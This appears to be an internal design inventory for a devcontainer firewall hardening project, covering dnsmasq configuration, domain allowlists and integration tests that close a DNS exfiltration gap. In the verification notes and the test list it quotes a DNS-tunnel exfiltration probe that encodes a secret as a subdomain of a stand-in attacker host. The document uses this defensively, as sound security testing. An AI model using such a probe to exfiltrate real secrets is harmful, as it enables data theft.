# Existing — technical inventory

> Snapshot of the code state at the start of this v2 plan. Updated when
> a session adds / removes / restructures major files.
> For chronological history, see [LOG.md](LOG.md).
> For decisions and philosophy, see [ROLLOUT.md](ROLLOUT.md).

## Inheritance from v1

The v1 rollout
([devcontainer-security-hardening](../devcontainer-security-hardening/))
delivered sessions 1+2 (bake-firewall-config + drop-env-injection). The
adversarial validation (session 6, 2026-05-22) confirmed all 3 critères
of the threat model are met, with one accepted gap (#9 DNS exfil — gap
P3) that v2 closes.

Read v1's [EXISTING.md](../devcontainer-security-hardening/EXISTING.md)
for the baseline architecture (lifecycle scripts, bind mounts, sudoers,
firewall layers L1-L6). The text below complements it with the v2-relevant
details.

## DNS architecture today (gap #9 closed in session 3)

### `dnsmasq.conf` baked at `/etc/devcontainer-firewall/dnsmasq.conf`

```conf
listen-address=127.0.0.53
bind-interfaces

no-resolv
no-hosts

# No default upstream — non-allowlisted queries return REFUSED (gap #9 closed).
# Sibling Docker peers are resolved by per-host server=/<name>/127.0.0.11
# lines emitted at boot from direct-tcp-allow.txt ; host.docker.internal is
# resolved by the ollama block's host-record= directive — both injected by
# init-firewall.sh into the generated dnsmasq-domains.conf.

cache-size=1000
```

Without any `server=` line as default upstream, dnsmasq returns REFUSED for
unmatched domains. The REFUSED response means the query is NOT forwarded
upstream → no leak. Empirically verified : `dig $(base64 secret).attacker.
example.invalid @127.0.0.53` → `status: REFUSED`.

### Generated `/var/run/devcontainer-firewall/dnsmasq-domains.conf`

Emitted by `compile-policy.py` from `domains.txt`. Per allowlisted
domain :

```
server=/api.anthropic.com/8.8.8.8           # explicit upstream override
ipset=/api.anthropic.com/allowed-domains    # populate ipset with resolved IPs
```

Then `init-firewall.sh` injects, **after** the compile-policy output :

1. **Ollama block** (unchanged) — `host-record=host.docker.internal,$IP` +
   `cname=ollama.{internal,local},host.docker.internal` + `local-ttl=3600`
   (cf. ollama-local knowledge file for why local-ttl is required).
2. **Unconditional claude-bridge override** (special-case) — strips the
   auto-emitted `server=/claude-bridge/8.8.8.8` (which is wrong because
   8.8.8.8 doesn't know about Docker peers) and emits
   `server=/claude-bridge/127.0.0.11` instead. claude-bridge is always
   declared in `docker-compose.yml` and always listed in `domains.txt`
   regardless of mode, so the override is unconditional.
3. **Generic sibling-resolve loop** (new in session 3) — iterates over
   `direct-tcp-allow.txt`, skipping `host` (alias for
   `host.docker.internal`, already handled) and `claude-bridge` (handled
   above), emitting `server=/<host>/127.0.0.11` + `cname=<host>.local,
   <host>` for each other entry.

### `init-firewall.sh` mode handling (modes : strict / basic / off)

| Mode | dnsmasq | ipset | mitmproxy | A2 addons |
|---|---|---|---|---|
| `strict` (default) | ✅ | ✅ | ✅ forward proxy | ✅ |
| `basic` | ✅ | ✅ | ❌ skipped | ❌ |
| `off` | ❌ | ❌ | ❌ | ❌ |

V2 fixes the dnsmasq config, which is loaded in both `strict` AND
`basic` modes. `off` mode unchanged (firewall bypassed by design).

## Source-of-truth files for the v2 fix (state after session 3)

### `templates/v2/firewall/dnsmasq.conf` (and `.devcontainer/firewall/dnsmasq.conf` mirror — both updated in session 3)

`server=127.0.0.11` dropped. Comment explains that sibling DNS is now
driven by per-host lines emitted by `init-firewall.sh` at boot.

### `templates/v2/init-firewall.sh` (and `.devcontainer/init-firewall.sh` mirror — both updated in session 3)

The old hardcoded claude-bridge block was kept as an **unconditional
override** (since claude-bridge is always declared in compose AND always
listed in domains.txt regardless of mode), followed by a **generic loop**
over `direct-tcp-allow.txt` for any other Docker peer that needs sibling
resolution. The loop skips `host` / `host.docker.internal` (ollama block
handles those) and `claude-bridge` (handled by the unconditional override
right above the loop, idempotent skip prevents double-emission).

### `templates/v2/firewall/direct-tcp-allow.txt` (already baked since v1 session 1)

Source-of-truth for non-HTTP direct-TCP bypass. Entries managed by
`claude-switch` per mode :

- `cloud` : empty
- `local-bridge` : `claude-bridge:9223`
- `local-direct` : `host:11434` (Ollama on host.docker.internal)

V2 adds a second consumer (the DNS sibling-resolve generator) — no
schema change.

### `templates/v2/firewall/domains.txt` (DO NOT promote to wildcard parents)

User decision : keep granular per-subdomain. The `*.domain.com` syntax
stays available (already used for `*.statsig.com`,
`*.gallerycdn.vsassets.io`, `*.githubusercontent.com`, `*.vo.msecnd.net`,
`*.vsassets.io`) but no automatic promotion happens in v2.

### `templates/v2/tests/integration/test-dns-strict.sh` (created in session 3)

7 tests :

- `test_poc9_evil_subdomain_refused` — `dig $(base64).attacker.example.invalid` → REFUSED ✅
- `test_unlisted_random_refused` — random subdomain → REFUSED ✅
- `test_allowlisted_anthropic_resolves` — api.anthropic.com → IPv4 ✅
- `test_session2_bridge_resolves` — bridge.claudeusercontent.com → IPv4 ✅
- `test_session2_codedocs_resolves` — code.claude.com → IPv4 ✅
- `test_hostdockerinternal_resolves` — host.docker.internal → IPv4 (ollama block) ✅
- `test_sibling_claudebridge_resolves_when_active` — claude-bridge → 172.x.x.x (skipped in cloud mode, exercised when claude-bridge:9223 active in direct-tcp-allow.txt)

## Threat model carryover

Same 3 critères as v1. v2 closes the residual #9 gap so critère 3
("node cannot exfil without rebuild") holds under a strict reading.
Closure proven empirically by the session 4 adversarial-validation
gate (2026-05-22) : PoC #9 replay returns `status: REFUSED`, payload
absent from all mitmproxy logs. Structural fix lives in commit
`2cd3cd6`. See [LOG.md §4](LOG.md) for verbatim probes.

## Reuse from prior planning

V2 borrows methodologically from v1 session 6's empirical-reload
approach : every change validated with an actual container reload to
prove behavior changed at runtime, not just statically in the config.
